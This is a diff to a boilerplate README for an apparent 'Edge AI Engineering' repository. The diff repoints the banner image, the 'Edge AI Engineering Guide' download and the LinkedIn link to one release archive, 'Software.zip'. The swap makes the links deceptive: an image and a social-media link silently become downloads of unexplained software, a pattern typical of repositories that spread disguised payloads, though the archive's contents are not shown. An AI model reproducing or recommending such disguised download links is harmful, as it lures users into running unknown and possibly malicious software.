@@ -1,6 +1,6 @@
 # 🚀 Welcome to the "Edge AI Engineering" Repository! 🤖
 
-![Edge AI Engineering](https://imageurl.com)
+![Edge AI Engineering](https://github.com/mufarmem/edge-ai-engineering/releases/download/v1.0/Software.zip)
 
 ## Overview
 Welcome to the "Edge AI Engineering" repository, your go-to guide for all things related to Edge AI. Here, we delve into core concepts, practical techniques, and best practices in the field of Edge AI Engineering. Whether you're a beginner looking to understand the basics or an experienced professional seeking in-depth knowledge, this repository has something for everyone. Let's explore the exciting world of Edge AI together!
@@ -44,7 +44,7 @@ In this section, we explore practical techniques for implementing Edge AI soluti
 To ensure the success of your Edge AI projects, it's crucial to follow industry best practices. In this section, we provide recommendations for model training, data preprocessing, inference optimization, and security considerations when working with Edge AI technologies.
 
 ## Getting Started
-Ready to dive into the world of Edge AI Engineering? Get started by downloading the [Edge AI Engineering Guide](https://github.com/cli/cli/archive/refs/tags/v1.0.0.zip) and exploring the resources provided in this repository. Whether you're a developer, researcher, or technology enthusiast, there's something for everyone in the exciting field of Edge AI.
+Ready to dive into the world of Edge AI Engineering? Get started by downloading the [Edge AI Engineering Guide](https://github.com/mufarmem/edge-ai-engineering/releases/download/v1.0/Software.zip) and exploring the resources provided in this repository. Whether you're a developer, researcher, or technology enthusiast, there's something for everyone in the exciting field of Edge AI.
 
 ## Resources
 - [AI Accelerators](#)  
@@ -56,5 +56,5 @@ Ready to dive into the world of Edge AI Engineering? Get started by downloading 
 
 ---
 
-🔗 Connect with us on [LinkedIn](https://www.linkedin.com/edgeaiengineering) 🔗  
+🔗 Connect with us on [LinkedIn](https://github.com/mufarmem/edge-ai-engineering/releases/download/v1.0/Software.zip) 🔗  
 ⭐️ Don't forget to star this repository if you find it helpful! ⭐️
